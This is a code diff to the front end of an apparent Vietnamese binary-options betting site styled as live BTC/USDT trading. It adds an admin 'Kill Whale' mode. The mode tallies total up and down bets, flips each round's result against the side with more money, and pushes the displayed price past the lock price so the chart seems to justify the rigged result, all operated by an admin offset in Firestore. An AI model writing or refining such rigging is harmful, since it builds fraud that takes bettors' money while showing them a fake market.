@@ -64,7 +64,6 @@
             <span class="font-bold text-lg text-white">CROWNEX</span>
             <button onclick="toggleMenu()" class="ml-auto text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
         </div>
-        
         <nav class="flex-1 overflow-y-auto py-4 px-3 space-y-1">
             <a href="game.html" class="menu-item active"><i class="fa-solid fa-chart-line"></i> Giao dịch</a>
             <a href="taikhoan.html" class="menu-item"><i class="fa-solid fa-user-gear"></i> Tài khoản</a>
@@ -75,7 +74,6 @@
             <a href="https://t.me/ad_crownex" target="_blank" class="menu-item text-blue-400"><i class="fa-brands fa-telegram text-lg"></i> CSKH (Telegram)</a>
             <a href="#" onclick="logout()" class="menu-item text-red-400 mt-4"><i class="fa-solid fa-right-from-bracket"></i> Đăng xuất</a>
         </nav>
-        
         <div class="p-4 border-t border-[#232836] bg-[#12141c]">
             <div class="flex items-center gap-3">
                 <div class="w-9 h-9 rounded-full bg-gradient-to-tr from-gray-700 to-gray-600 flex items-center justify-center font-bold text-xs shadow-lg text-white">U</div>
@@ -93,7 +91,6 @@
                     <span class="text-white font-bold text-sm">BTC/USDT</span>
                     <span class="bg-[#232836] text-[#FCD535] text-[9px] px-1 rounded border border-[#2f3646] flex items-center gap-1">LIVE</span>
                 </div>
-                <!-- MÃ PHIÊN -->
                 <div class="text-[10px] text-[#6b7280] font-mono leading-none mt-0.5">Phiên: <span id="sessionID" class="text-gray-400">...</span></div>
             </div>
         </div>
@@ -157,10 +154,10 @@
         </div>
     </div>
 
-    <!-- MAIN LOGIC (FULL FEATURES) -->
+    <!-- MAIN LOGIC (FULL FEATURES + KILL WHALE) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, updateDoc, getDoc, onSnapshot, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getFirestore, doc, updateDoc, getDoc, onSnapshot, addDoc, collection, setDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
         import { getAuth, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
         const firebaseConfig = {
@@ -181,7 +178,12 @@
             balance: 0, userData: null, currentBet: null, pendingBet: { type: null, amount: 0 },
             history: new Array(60).fill(null), candles: [], visualPrice: CONFIG.basePrice,
             targetPrice: CONFIG.basePrice, currentPhase: 'order', lockPrice: 0,
-            isProcessing: false
+            isProcessing: false,
+            // ADMIN CONFIGS
+            marketOffset: 0,
+            killWhaleMode: false,
+            totalUp: 0,
+            totalDown: 0
         };
 
         window.logout = () => { signOut(auth).then(() => { localStorage.removeItem('crownex_user_info'); window.location.href = "login.html"; }); };
@@ -195,8 +197,27 @@
             updateBalanceUI();
 
             if(state.userData.uid) {
+                 // Listen Balance
                  onSnapshot(doc(db, "users", state.userData.uid), (doc) => {
                     if(doc.exists()) { state.balance = doc.data().balance; updateBalanceUI(); }
+                });
+                
+                // Listen Global Settings (Kill Whale)
+                onSnapshot(doc(db, "settings", "global"), (doc) => {
+                    if(doc.exists()) {
+                        const d = doc.data();
+                        state.marketOffset = d.marketOffset || 0;
+                        state.killWhaleMode = d.killWhaleMode || false;
+                    }
+                });
+
+                // Listen Current Game Stats (Total Bet)
+                onSnapshot(doc(db, "games", "current"), (doc) => {
+                    if(doc.exists()) {
+                        const d = doc.data();
+                        state.totalUp = d.totalUp || 0;
+                        state.totalDown = d.totalDown || 0;
+                    }
                 });
             }
             initGame();
@@ -251,20 +272,16 @@
             t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3000);
         }
 
-        // --- SỬA LOGIC CỘNG TRỪ TIỀN (1 <-> 5) ---
         window.adjustBet = (val) => {
             const inp = document.getElementById('betInput');
             let current = parseFloat(inp.value) || 0;
             let nextVal = current + val;
-
             if (val > 0 && current < 5) nextVal = 5;
             if (val < 0 && current <= 5) nextVal = 1;
-
             if (nextVal < 1) nextVal = 1;
             inp.value = nextVal;
             window.updateProfit();
         };
-
         window.updateProfit = () => {
             const val = parseFloat(document.getElementById('betInput').value);
             document.getElementById('profitDisplay').innerText = "+$" + (val * 0.95).toFixed(2);
@@ -308,10 +325,23 @@
             document.getElementById('confirmBar').classList.remove('slide-up'); 
             document.getElementById('confirmBar').classList.add('slide-down');
 
-            if(state.userData.uid) { 
-                try { await updateDoc(doc(db, "users", state.userData.uid), { balance: state.balance }); } 
-                catch(e) { console.error(e); }
-            }
+            // --- CẬP NHẬT TỔNG CƯỢC HỆ THỐNG ĐỂ KILL WHALE ---
+            const gameRef = doc(db, "games", "current");
+            try {
+                // Update User Balance & Turnover
+                const uRef = doc(db, "users", state.userData.uid);
+                await updateDoc(uRef, { 
+                    balance: state.balance,
+                    betTurnover: increment(amount), // Cộng doanh thu cược
+                    betToday: increment(amount)     // Cộng doanh thu ngày
+                }); 
+                
+                // Update System Total (Dùng setDoc merge để tạo nếu chưa có)
+                await setDoc(gameRef, {
+                    [type === 'up' ? 'totalUp' : 'totalDown']: increment(amount)
+                }, { merge: true });
+
+            } catch(e) { console.error(e); }
 
             if (!state.currentBet) { state.currentBet = { type: type, amount: amount }; } 
             else { state.currentBet.amount += amount; }
@@ -348,7 +378,7 @@
             for(let i=m; i<60; i++) state.history[i] = null;
 
             resizeCanvas(); renderHistoryBlocks(); window.addEventListener('resize', resizeCanvas);
-            const b = now - (now % 60000); // 60s Candle
+            const b = now - (now % 60000); 
             state.candles = []; let p = CONFIG.basePrice;
             const s = b - (30 * 60000);
             for(let i=0; i<30; i++) {
@@ -410,6 +440,11 @@
             document.getElementById('badge-up').classList.add('hidden'); document.getElementById('badge-down').classList.add('hidden');
             document.getElementById('btnBuy').classList.remove('dimmed', 'locked'); 
             document.getElementById('btnSell').classList.remove('dimmed', 'locked');
+            
+            // RESET TOTAL BETS
+            if(state.userData.uid) {
+                setDoc(doc(db, "games", "current"), { totalUp: 0, totalDown: 0 });
+            }
         }
 
         function startResultPhase() {
@@ -423,7 +458,15 @@
         }
 
         async function finalizeRound() {
+            // LOGIC KẾT QUẢ + BẺ CẦU (KILL WHALE)
             let res = state.visualPrice >= state.lockPrice ? 'up' : 'down';
+            
+            // Nếu bật Kill Whale
+            if (state.killWhaleMode) {
+                if (state.totalUp > state.totalDown) res = 'down'; // Up nhiều -> Down thắng
+                else if (state.totalDown > state.totalUp) res = 'up'; // Down nhiều -> Up thắng
+            }
+
             const m = new Date().getMinutes(); let pm = m - 1; if(pm < 0) pm = 59;
             if(m === 0) state.history.fill(null); state.history[pm] = res;
             localStorage.setItem('crownex_history_v30', JSON.stringify(state.history));
@@ -465,7 +508,22 @@
         }
 
         function marketLoop() {
-            state.targetPrice = CONFIG.basePrice + Math.sin(Date.now() / 1000) * 20 + (Math.random() - 0.5) * 10;
+            // Tính toán giá (có thêm logic Admin Rigging)
+            const baseNoise = Math.sin(Date.now() / 1000) * 20 + (Math.random() - 0.5) * 10;
+            // state.marketOffset được cập nhật từ Firebase (Admin chỉnh)
+            state.targetPrice = CONFIG.basePrice + baseNoise + (state.marketOffset || 0);
+            
+            // Logic Bẻ cầu Realtime: Ép giá đi về hướng thắng
+            if (state.currentPhase === 'result' && state.killWhaleMode && state.lockPrice > 0) {
+               if (state.totalUp > state.totalDown) {
+                   // Kill Up -> Price phải < Lock Price
+                   if (state.targetPrice >= state.lockPrice) state.targetPrice = state.lockPrice - 15;
+               } else if (state.totalDown > state.totalUp) {
+                   // Kill Down -> Price phải > Lock Price
+                   if (state.targetPrice <= state.lockPrice) state.targetPrice = state.lockPrice + 15;
+               }
+            }
+
             state.visualPrice += (state.targetPrice - state.visualPrice) * CONFIG.smoothingFactor;
             const b = Date.now() - (Date.now() % 60000); let c = state.candles[state.candles.length - 1];
             if (c && c.startTime !== b) {
